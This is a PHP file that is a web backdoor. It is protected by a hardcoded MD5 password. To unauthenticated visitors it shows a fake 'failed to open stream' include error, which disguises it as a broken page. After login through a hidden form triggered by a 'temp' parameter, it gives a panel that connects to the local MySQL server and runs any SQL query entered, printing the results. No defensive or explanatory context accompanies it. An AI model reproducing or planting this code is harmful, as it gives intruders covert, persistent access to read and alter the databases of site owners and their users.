<?php
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
error_reporting(E_ALL & ~E_NOTICE);
$pass = md5($_POST['pass']);
$me = "83cf1e45074275561a8b6ef539359342";
if ($pass == $me) {
    $_SESSION['9xyz'] = "$pass";
}
if ($_SERVER["HTTP_CLIENT_IP"]) {
    $ip = $_SERVER["HTTP_CLIENT_IP"];
} else {
    if ($_SERVER["HTTP_X_FORWARDED_FOR"]) {
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } else {
        if ($_SERVER["REMOTE_ADDR"]) {
            $ip = $_SERVER["REMOTE_ADDR"];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    }
}
$ip = htmlspecialchars($ip);
if (! isset($_SESSION['9xyz']) or $_SESSION['9xyz'] != $me) {
    if (! empty($_GET['temp'])) {
        die("
<form method=post>
<input type=password name=pass size=30 tabindex=1>
</form>
");
    } else {
        die("
<b>Warning</b>:  include(./common.php) [<a href=function.include>function.include</a>]:
failed to open stream: No such file or directory in <b>/home/include/common.php
</b> on line <b>17</b><br><br>
");
    }
}
?>
    <form action="" method="post">
        <div class="inputNOption">
            <div class="smallTitle">Username:</div>
            <input name="username" value="<?=@$_POST['username'];?>" type="text" class="textInput"/>
        </div>
        <!--/inputNoption-->
        <div class="inputNOption">
            <div class="smallTitle">Password:</div>
            <input name="pass" value="<?=@$_POST['pass'];?>" type="text" class="textInput"/>
        </div>
        <!--/inputNoption-->
        <div class="inputNOption">
            <div class="smallTitle">database:</div>
            <input name="database" value="<?=@$_POST['database'];?>" type="text" class="textInput"/>
        </div>
        <!--/inputNoption-->
        <div class="inputNOption">
            <div class="inputTextarea">
                <div class="smallTitle">Query:</div>
                <br/><br/>
                <textarea id="textarea1" name="query" rows="30"></textarea>
            </div>
            <!--/inputTextarea-->

            <input type="submit" name="do_code" id="submit" value="DO"/>
    </form>
<?php
if (isset($_POST['username']) and $_POST['username'] != null) {
    $hostname_config = "localhost";
    $database_config = $_POST['database'];
    $username_config = $_POST['username'];
    $password_config = $_POST['pass'];
    $config = mysql_pconnect($hostname_config, $username_config, $password_config) or trigger_error(mysql_error(),
        E_USER_ERROR);
    mysql_select_db($database_config);
    $res = mysql_query($_POST['query']);
    if (@mysql_num_rows($res) > 0) {
        while ($data[] = mysql_fetch_assoc($res)) {
            ;
        }
        echo "<pre>";
        print_r($data);
        echo "</pre>";
    }
}
?>